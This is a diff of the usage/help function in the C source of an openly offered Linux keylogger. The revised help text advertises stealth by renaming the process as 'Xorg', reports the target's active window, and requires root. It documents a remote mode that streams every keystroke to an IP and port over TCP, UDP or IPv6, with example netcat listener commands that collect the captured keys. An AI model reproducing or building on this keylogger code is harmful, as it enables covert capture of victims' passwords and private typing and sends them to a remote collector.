@@ -22,16 +22,22 @@ int main(int argc, char** argv)
     }
 
 	void usage()
-	{
-		banner();
-		fprintf(stderr,"\nUsage: #%s [OPTIONS]\n", argv[0]);
-		fprintf(stderr,"\nOPTIONS:\n\t-d <input-device>:\t\t\tIf not specified, the default device is '/dev/input/by-path/***kbd'\n");
-		fprintf(stderr,"\t-o <output-file>:\t\t\tIt can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'\n");
-		fprintf(stderr,"\t-m remote -a <IP-ADDR> -p <PORT>:\tIt sends all the keystrokes on the remote server located at <IP-ADDR:PORT>\n");
-		fprintf(stderr,"\nEXAMPLE:\n\tServer$ nc -lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
-		fprintf(stderr,"\n\t--- It works with ipv6 too ---\n\n\tServer$ nc -6 -lvp 8888 > logger.txt\n\tClient#%s -m remote -a ::1 -p 8888\n",argv[0]);
-		exit(0);
-	}
+        {
+                banner();
+                fprintf(stderr,"\nDESCRIPTION:\n\n\t- Simple keylogger that runs on Linux either locally or remotely.\n\t- It shows the active window on which the target is writing.\n");
+                fprintf(stderr,"\t- Keys are mapped on US keyboard.\n\t- It shows the keyboard layout(e.g.: us, it, colemak, etc..).\n");
+                fprintf(stderr,"\t- Process name is renamed as \"Xorg\".\n\t- It works with both TCP and UDP and with ipv6 too.\n\t- It must be run as root.\n");
+                fprintf(stderr,"\nSYNOPSIS:\n\n\t#%s [OPTIONS]\n", argv[0]);
+                fprintf(stderr,"\nOPTIONS:\n\n\t-d <input-device>:\t\t\tIf not specified, the default device is '/dev/input/by-path/***kbd'\n");
+                fprintf(stderr,"\t-o <output-file>:\t\t\tIt can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'\n");
+                fprintf(stderr,"\t-m remote -a <IP-ADDR> -p <PORT>:\tIt sends all the keystrokes on the remote server located at <IP-ADDR:PORT>\n");
+                fprintf(stderr,"\nEXAMPLES:\n");
+                fprintf(stderr,"\n\t[TCP]\n\tServer$ nc -lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
+                fprintf(stderr,"\n\t[UDP]\n\tServer$ nc -u -lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
+                fprintf(stderr,"\n\t[IPv6]\n\tServer$ nc -6 -lvp 8888 > logger.txt\n\tClient#%s -m remote -a ::1 -p 8888\n",argv[0]);
+                exit(0);
+        }
+
 	
 	
 	
